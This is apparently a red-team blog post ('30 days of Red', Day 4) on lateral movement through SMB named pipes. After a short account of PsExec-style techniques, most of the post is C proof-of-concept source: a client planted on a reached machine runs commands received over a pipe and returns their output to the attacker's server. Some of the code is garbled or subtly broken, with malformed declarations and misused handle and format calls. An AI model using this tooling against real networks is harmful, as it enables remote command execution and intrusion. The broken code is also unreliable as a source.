---
layout: post
title: "30 days of Red- Day 4"
date: 2021-4-3 00:00:00 -0400
categories: Writeup
---



```C


███████╗    ██████╗  █████╗ ██╗   ██╗███████╗     ██████╗ ███████╗    ██████╗ ███████╗██████╗ 
╚════██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝    ██╔══██╗██╔════╝██╔══██╗
    ██╔╝    ██║  ██║███████║ ╚████╔╝ ███████╗    ██║   ██║█████╗      ██████╔╝█████╗  ██║  ██║
   ██╔╝     ██║  ██║██╔══██║  ╚██╔╝  ╚════██║    ██║   ██║██╔══╝      ██╔══██╗██╔══╝  ██║  ██║
   ██║      ██████╔╝██║  ██║   ██║   ███████║    ╚██████╔╝██║         ██║  ██║███████╗██████╔╝
   ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝         ╚═╝  ╚═╝╚══════╝╚═════╝ 
                                                                                              


██████╗  █████╗ ██╗   ██╗    ██╗  ██╗
██╔══██╗██╔══██╗╚██╗ ██╔╝    ██║  ██║
██║  ██║███████║ ╚████╔╝     ███████║
██║  ██║██╔══██║  ╚██╔╝      ╚════██║
██████╔╝██║  ██║   ██║            ██║
╚═════╝ ╚═╝  ╚═╝   ╚═╝            ╚═╝
                                     
```



## Lateral Movement with Named Pipes

When using named pipes which utilize the SMB protocol, you can establish a client,server connection between two endpoints. The server endpoint will be on your compromised host and the client will be on the machine your compromised user has access to in some way. A few known methods of doing this in the past, have been **`PsExec`** and Cobalt's Strike implementation **`PsExec(psh)`**. The former achieved this by logging into the $ADMIN share and dropping a exe file, that established a named pipe connection to the compromised machine. The later achieved this by logging into the $ADMIN share, but instead of dropping an exe file it instead ran base64 encoded Powershell to establish a named pipe connection to the compromised machine. The Poc below is two exes, a server named pipe and a client named pipe. The scenario is that you have already connected to the $ADMIN share and dropped your client exe unto the machine, and it simply executes one command and writes it back through named pipe to your compromised machine.

```c
Client Named Pipe: Usage: clientnamedpipe.exe [ip here where server endpoint is hosted ] testpipe
#include <windows.h>
#include <stdio.h>

#define MAX_SIZE 1024

int main(int argc,char **argv){

DWORD dRead;
CHAR _RemoteNamedPipe= (CHAR_)GlobalAlloc(GPTR,MAX_SIZE);
DWORD dWritten = 0;
char command[MAX_SIZE];
char output[MAX_SIZE];
snprintf(RemoteNamedPipe,MAX_SIZE,"\\\\%s\\pipe\\%s",argv[1],argv[2]);
printf("Connecting to %s\n", RemoteNamedPipe);
HANDLE hPipe = CreateFile(RemoteNamedPipe,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,
                          OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
printf("0x%p\n",hPipe);
printf("1 %d\n",GetLastError());
ReadFile(hPipe,command,MAX_SIZE,&dRead,NULL);
printf("2 %d\n",GetLastError());
printf("%s\n",command);
FILE *pPipe= _popen(command,"r");
while(fgets(output,MAX_SIZE,pPipe)){
puts(output);
}
printf("4 %d\n",GetLastError());
printf("%s\n",output);
WriteFile(hPipe,output,strlen(output),&dWritten,NULL);

CloseHandle(pPipe);
CloseHandle(RemoteNamedPipe);
GlobalFree(RemoteNamedPipe);

}

```

```c
Server Named Pipe: Usage: servernamedpipe.exe "whoami"

#include <windows.h>
#include <stdio.h>
#define MAX_SIZE 1024

int main(int argc,char **argv){
DWORD dwRead;
DWORD dWrote=0;
char buffer[MAX_SIZE];
HANDLE hPipe= CreateNamedPipeA("\\\\.\\pipe\\testpipe",PIPE_ACCESS_DUPLEX,PIPE_TYPE_BYTE|PIPE_READMODE_BYTE,
                                PIPE_UNLIMITED_INSTANCES,MAX_SIZE,0,10000,NULL);
printf("hPipe 0x%p\n",hPipe);
ConnectNamedPipe(hPipe,NULL);
WriteFile(hPipe,argv[1],strlen(argv[1]),&dWrote,NULL);
ReadFile(hPipe,buffer,MAX_SIZE,&dwRead,NULL);

printf("We received this amount of data %d\n",dwRead);
for(int i=0;i<sizeof(buffer);i++){
printf("This is the data %s\n",buffer[i]);
}

DisconnectNamedPipe(hPipe);
CloseHandle(hPipe);
return 0;

}
```

